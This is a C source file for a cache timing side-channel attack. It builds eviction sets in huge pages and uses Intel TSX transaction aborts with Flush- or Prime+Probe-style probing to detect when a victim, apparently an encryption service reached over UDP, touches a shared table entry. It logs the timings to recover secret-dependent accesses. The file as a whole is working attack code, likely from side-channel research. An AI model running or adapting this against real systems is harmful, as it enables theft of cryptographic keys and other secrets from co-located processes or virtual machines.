#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/wait.h>
#include <time.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <immintrin.h> //tsx
#include <poll.h>

#include "Table.h"       /*Shared library*/
#include "cache_utils.h" /*Cache manipulation functions*/

/*For huge pages*/
#define FILE_NAME "/mnt/hugetlbfs/filehuge"
#define PROTECTION (PROT_READ | PROT_WRITE)
/* Only ia64 requires this */
#ifdef __ia64__
#define ADDR (void *)(0x8000000000000000UL)
#define FLAGS (MAP_SHARED | MAP_FIXED)
#else
#define ADDR (void *)(0x0UL)
#define FLAGS (MAP_SHARED)
#endif

#define OPTSTR "t:o:d:a:s:pfh"
#define USAGE_FMT "[-d detectionaddress][-a targetaddress] [-t wait time] [-o outputfile] [-p for access based eviction][-f flush based eviction][-s ip address][-h]"

#define TIME_LIMIT 140 /*Time for main memory access, must be calibrated*/
#define PACKET_SIZE 24
#define NUM_SAMPLES 10000
#define NUM_CANDIDATES 3 * CACHE_SET_SIZE *CACHE_SLICES
#define RES_MEM (1UL * 1024 * 1024) * 4 * CACHE_SIZE

#define CLEAN_NOISE 1 /*For Reload+Refresh to detect noise and reset cache state*/
#define WAIT_FIXED 1  /*Defines if it is possible to "wait" between samples*/

int target_pos; //Should be the same in the server
int detection_pos;
int time_limit;
long int *base_address;
long int *target_address;
long int *detection_address;
long int candidates_set[NUM_CANDIDATES];
long int filtered_set[NUM_CANDIDATES];
long int eviction_set[CACHE_SET_SIZE * CACHE_SLICES];
long int elements_set[CACHE_SET_SIZE];
long int elements_set_1[CACHE_SET_SIZE];
long int invariant_part[CACHE_SET_SIZE * CACHE_SLICES];
char packet[PACKET_SIZE * 2];
char response[PACKET_SIZE];

int fd;
FILE *out_fd;
uintptr_t phys_addr;
int slice, set;
int wait_time;
struct sockaddr_in server;
int s;

struct timespec request, remain;

void usage(char *progname, int opt)
{
    fprintf(stderr, USAGE_FMT);
    exit(EXIT_FAILURE);
}

void calibrate_flush(void)
{
    int i, t;
    int sum = 0;
    t = 500;
    while (t > 300)
    {
        t = access_timed_flush(target_address);
    }
    for (i = 0; i < 20000; i++)
    {
        t = access_timed_flush(target_address);
        if (t < 300)
        {
            sum += t;
        }
        else
        {
            sum += 300;
        }
        //sum += access_timed_flush(target_address);
    }
    int mean = sum / 20000;
    time_limit = sum - 40;
    if (time_limit > 200)
    {
        time_limit = 180;
    }
    printf("The threshold for a cache miss is %i %i \n", mean, time_limit);
}

int send_packet(char packet[PACKET_SIZE])
{
    /*Generates random packet sends request, reloads data when response is received*/
    int i;
    struct pollfd p;

    send(s, packet, PACKET_SIZE, 0);
    p.fd = s;
    p.events = POLLIN;
    if (poll(&p, 1, 10) <= 0)
        return 0;
    while (p.revents & POLLIN)
    {
        if (recv(s, response, sizeof response, 0) == sizeof response)
        {
            if (!memcmp(packet, response, PACKET_SIZE - sizeof(uint64_t)))
            {
                return 1;
            }
            return 0;
        }
        if (poll(&p, 1, 0) <= 0)
            break;
    }
}

void check_dedup(long int *target_address)
{
    int i, t, res;
    int cont = 0;
    while (cont < 20)
    {
        //Random packet to send
        for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
            packet[i] = random();
        *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % 10000);
        t = access_timed_flush(target_address);
        res = send_packet(packet);
        lfence(); //Ensure the time is not read in advance
        if (res > 0)
        {
            t = access_timed_flush(target_address);
            if (t < time_limit)
            {
                cont++;
            }
        }
    }
}

int main(int argc, char **argv)
{
    int t, cont;
    unsigned long tim;
    int shared_memory = 0;
    int opt;
    while ((opt = getopt(argc, argv, OPTSTR)) != EOF)
        switch (opt)
        {
        case 's':
            if (!inet_aton(optarg, &server.sin_addr))
                return -1;
            server.sin_family = AF_INET;
            server.sin_port = htons(10000);

            while ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
                sleep(1);
            while (connect(s, (struct sockaddr *)&server, sizeof server) == -1)
                sleep(1);
            break;
        case 'a':
            target_pos = atoi(optarg);
            if (!target_pos)
            {
                printf("Error with the target address \n");
                return -1;
            }
            target_address = (long int *)get_address_table(target_pos);
            //target_address = (long int *)get_address_quixote(target_pos);
            printf("Target address %lx \n", (long int)target_address);
            break;
        case 'd':
            detection_pos = atoi(optarg);
            if (!detection_pos)
            {
                printf("Error with the target address \n");
                return -1;
            }
            detection_address = (long int *)get_address_table(detection_pos);
            //target_address = (long int *)get_address_quixote(target_pos);
            printf("Detection address %lx \n", (long int)detection_address);
            break;
        case 't':
            break;
        case 'o':
            out_fd = fopen(optarg, "w");
            if (out_fd == NULL)
                fprintf(stderr, "Unable to open file\n");
            break;
        case 'p':
            shared_memory = 0;
            break;
        case 'f':
            shared_memory = 1;
            break;
        case 'h':
        default:
            usage(basename(argv[0]), opt);
            break;
        }

    calibrate_flush();
    /*Allocate memory using hugepages*/
    fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
    if (fd < 0)
    {
        perror("Open failed");
        exit(1);
    }
    unsigned long reserved_size = RES_MEM;
    base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
    if (base_address == NULL)
    {
        printf("error allocating\n");
        exit(1);
    }
    if (base_address == MAP_FAILED)
    {
        perror("mmap");
        unlink(FILE_NAME);
        exit(1);
    }
    long int mem;
    for (mem = 0; mem < ((reserved_size) / 8); ++mem)
    {
        *(base_address + mem) = mem;
    }
    printf("Reserved hugepages at %lx \n", (long int)base_address);
    /*Set generation*/
    int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
    generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
    initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, time_limit);
    store_invariant_part(eviction_set, invariant_part);

    //Although not necessary for the attack included for easing the deduplication and the profiling
    /*Check deduplication*/
    check_dedup(detection_address);
    profile_address(invariant_part, eviction_set, detection_address, &set, &slice);
    printf("Set and Slice %i %i \n", set, slice);
    printf("Ready \n");

    /*Create the eviction set that matches with the target*/
    generate_new_eviction_set(set, invariant_part, eviction_set);
    write_linked_list(eviction_set);
    long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];

    if (shared_memory == 1)
    {
        //TSX + flush
        int t_detection2;
        int t_detection, status;
        int forced_aborts = 0;
        unsigned long int inter1, inter2;
        volatile int pp = 0;
        unsigned long int inter = timestamp();
        probe_one_set(prime_address);
        cont = 0;
        while (cont < NUM_SAMPLES)
        {
            status = _xbegin();
            if (status == _XBEGIN_STARTED)
            {
                int time_pp = probe_one_set(prime_address);
                while (1)
                {
                }
                _xend();
            }
            else
            {
                /*Get time and check if the abort is due to an encyrption*/
                inter = timestamp();
                t_detection = access_timed_flush(detection_address);

                ///Detected
                if (t_detection < time_limit)
                {
                    //////Counter based
                    /*pp=0;
	                 while(pp<wait_time){
	                     pp++;
	                 }*/
                    //////Time based
                    while (timestamp() < (inter + wait_time))
                    {
                    }

                    __sync_synchronize(); ////Fence to try to fix the last flush
                    flush_data(target_address);
                    inter1 = timestamp();

                    /*Wait for some time before recovering the info*/
                    unsigned long int t_wait1 = inter1 + 1000; // 1000 depends on the victim code
                    inter2 = timestamp();
                    while (inter2 < t_wait1)
                    {
                        inter2 = timestamp();
                    }
                    __sync_synchronize();
                    t_detection2 = access_timed_flush((long int *)(target_address));
                    cont++;
                    fprintf(out_fd, "%i %lu %lu %i\n", t_detection, inter, inter1, t_detection2);
                }
                __sync_synchronize();
                probe_one_set(prime_address); /// Final probe to make things faster
            }
            //fprintf(out_fd, "%i %lu %lu %i\n", t_detection, inter, inter1, t_detection2);
        }
    }
    else
    {
        //TSX + access
        //Prepare the sets
        int i,kkk;
        if (CACHE_SET_SIZE == 12)
        {
            for (kkk = 0; kkk < CACHE_SET_SIZE; ++kkk)
            {
                elements_set[kkk] = eviction_set[slice * CACHE_SET_SIZE + kkk];
            }
            // For L1 cache
            elements_set_1[0] = eviction_set[slice * CACHE_SET_SIZE + 1];
            elements_set_1[1] = eviction_set[slice * CACHE_SET_SIZE + 2];

            for (kkk = 2; kkk < CACHE_SET_SIZE - 2; ++kkk)
            {
                elements_set_1[kkk] = eviction_set[slice * CACHE_SET_SIZE + kkk + 2];
            }
            elements_set_1[CACHE_SET_SIZE - 2] = eviction_set[slice * CACHE_SET_SIZE + 3];
            ///Other address
            elements_set_1[CACHE_SET_SIZE - 1] = eviction_set[((slice + 2) % CACHE_SLICES) * CACHE_SET_SIZE]; //Unrelated address
        }
        else
        {
            for (kkk = 0; kkk < CACHE_SET_SIZE; ++kkk)
            {
                elements_set[kkk] = eviction_set[slice * CACHE_SET_SIZE + kkk];
            }

            for (kkk = 0; kkk < CACHE_SET_SIZE - 1; ++kkk)
            {
                elements_set_1[kkk] = eviction_set[slice * CACHE_SET_SIZE + kkk + 1];
            }
            elements_set_1[CACHE_SET_SIZE - 1] = eviction_set[((slice + 2) % CACHE_SLICES) * CACHE_SET_SIZE]; //Unrelated address
        }

        ////Prepare the desired pattern
        for (i = 0; i < CACHE_SET_SIZE; ++i)
        {
            long int *dir_mem = (long int *)(elements_set_1[i] + OFF + OFF);
            long int dir_sig;
            if ((i % CACHE_SET_SIZE) != (CACHE_SET_SIZE - 1))
            {
                dir_sig = elements_set_1[i + 1] + OFF + OFF;
            }
            else
            {
                dir_sig = elements_set_1[CACHE_SET_SIZE - 1];
            }
            *(dir_mem) = dir_sig;
        }

	for (i = 0; i < CACHE_SET_SIZE; ++i)
	{
	    printf("%lx %lx %lx\n",*(long int*)(elements_set[i]),elements_set[i],*(long int *)(elements_set_1[i] + OFF + OFF));
	}	

        int t_detection2, t_detection3;
        int t_detection, status;
        int forced_aborts = 0;
        unsigned long int inter1, inter2;
        volatile int pp = 0;
        //=lectura_data((long int*)(posicion_lectura));
        unsigned long int inter = timestamp();
        reset_all_ages(elements_set);
        __sync_synchronize();
        cont = 0;
        while (cont < NUM_SAMPLES)
        {
            status = _xbegin();
            if (status == _XBEGIN_STARTED)
            {
                __sync_synchronize();
//		probe_reprobe((long int *)(elements_set[0]), (long int *)(elements_set[1]));
                probe_reprobe((long int *)(elements_set[0]), (long int *)(elements_set_1[0] + OFF + OFF));
                __sync_synchronize();
                /*             lectura_data((long int *)elements_set[1]);
            __sync_synchronize();
            lectura_data((long int *)prime_addresses[2]); */

                while (1)
                {
                }
                _xend();
            }
            else
            {
                /*Wait and check*/
                inter = timestamp();
                while (timestamp() < (inter + wait_time))
                {
                }
                __sync_synchronize();
                t_detection = access_timed((long int*)elements_set[0]); // Access the first element forces a miss should be out
                __sync_synchronize();
  //              inter1 = timestamp();
                /*If it is out means cache conflicting*/
                if (t_detection > time_limit)
                {
                    //////Counter based
                    /*pp=0;
	             while(pp<wait_time){
	                 pp++;
	            }*/
                    /*Wait for some time before recovering the info*/
                    unsigned long int t_wait1 = inter1 + 1000; // 1000 depends on the victim code
                    inter2 = timestamp();
                    while (inter2 < t_wait1)
                    {
                        inter2 = timestamp();
                    }
                    __sync_synchronize();
                    //recovery
                    t_detection2 = access_timed((long int *)(elements_set[1]));
                    cont++;
                    fprintf(out_fd, "%i %lu %lu %lu %i\n", t_detection, inter, inter1, inter-inter1, t_detection2);
                }
		flush_data((long int *)(elements_set_1[CACHE_SET_SIZE-1]));
                reset_all_ages(elements_set);
		inter1=timestamp();
            }
            //fprintf(out_fd, "%i %lu %lu %i\n", t_detection, inter, inter1, t_detection2);
        }
    }

    fclose(out_fd);
    /*Release huge pages*/
    close(fd);
    unlink(FILE_NAME);
    return 0;
}
